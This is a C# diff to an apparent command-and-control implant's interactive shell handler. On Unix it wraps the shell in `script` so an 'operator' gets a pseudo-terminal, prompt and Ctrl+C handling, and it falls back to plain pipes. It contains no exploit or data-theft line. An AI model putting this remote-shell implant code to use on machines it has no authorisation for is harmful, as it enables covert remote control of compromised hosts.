@@ -14,19 +14,22 @@ namespace Rod.Implant.Internal;
 // The channel is byte-transparent and the handler is transport-blind: it
 // pumps bytes through an IChannelStream (the registry's channel contract,
 // Capabilities.cs) and never touches gRPC, so the wire contract places no
-// interpretation on the traffic. The reference implementation wires the
-// shell's stdio pipes to the channel -- the documented, mainstream mechanism
-// the one-shot shell.exec already uses, which means no pseudo-terminal
-// allocation: the shell runs non-interactively (on Unix shells without a tty
-// there is no prompt or line editing). A PTY-backed handler is a drop-in
-// replacement over the same channel contract.
+// interpretation on the traffic. On Unix the shell runs under `script`,
+// which allocates a pseudo-terminal for it -- the channel then behaves like
+// a real terminal: the shell prints its prompt, line editing works, and the
+// interrupt byte (0x03, the operator pane's ^C) becomes SIGINT for the
+// foreground program, so Ctrl+C kills the running command rather than the
+// shell. Where `script` is missing, or on platforms without an equivalent
+// (Windows would want ConPTY), the handler falls back to the plain pipes
+// shape: byte-transparent but with no terminal semantics -- no prompt, no
+// echo, no signal byte.
 
 /// <summary>
-/// The interactive shell handler: spawns the platform shell with redirected
-/// stdio and pumps three pipes until the channel ends -- stdout and stderr
-/// upstream as output chunks, operator input downstream into the shell's
-/// stdin. The optional arguments string is an initial command, shell.exec's
-/// grammar carried over, run once before the channel holds the session open.
+/// The interactive shell handler: spawns the platform shell (under a
+/// pseudo-terminal on Unix) and pumps the pipes until the channel ends --
+/// output upstream as chunks, operator input downstream into the shell. The
+/// optional arguments string is an initial command, shell.exec's grammar
+/// carried over, run once before the channel holds the session open.
 /// </summary>
 internal static class InteractiveShell
 {
@@ -56,9 +59,43 @@ internal static class InteractiveShell
             CreateNoWindow = true,
         };
 
+        // The pseudo-terminal wrapper. util-linux script takes the command
+        // as one -c string and -e propagates the child's exit code; BSD
+        // script (macOS) takes it as trailing arguments. Both quiet their own
+        // chatter with -q and log nothing with /dev/null as the typescript
+        // file.
+        if (OperatingSystem.IsLinux())
+        {
+            psi.FileName = "script";
+            psi.ArgumentList.Add("-qec");
+            psi.ArgumentList.Add(shell);
+            psi.ArgumentList.Add("/dev/null");
+        }
+        else if (OperatingSystem.IsMacOS())
+        {
+            psi.FileName = "script";
+            psi.ArgumentList.Add("-q");
+            psi.ArgumentList.Add("/dev/null");
+            psi.ArgumentList.Add(shell);
+        }
+
         try
         {
-            using var process = Process.Start(psi);
+            Process? started;
+            try
+            {
+                started = Process.Start(psi);
+            }
+            catch (System.ComponentModel.Win32Exception) when (psi.FileName == "script")
+            {
+                // No `script` on this box (a stripped container, say): the
+                // plain pipes shape still talks to the shell, just without
+                // terminal semantics.
+                psi.FileName = shell;
+                psi.ArgumentList.Clear();
+                started = Process.Start(psi);
+            }
+            using var process = started;
             if (process is null)
                 return (TaskOutcome.Failed, "failed to start shell");
 
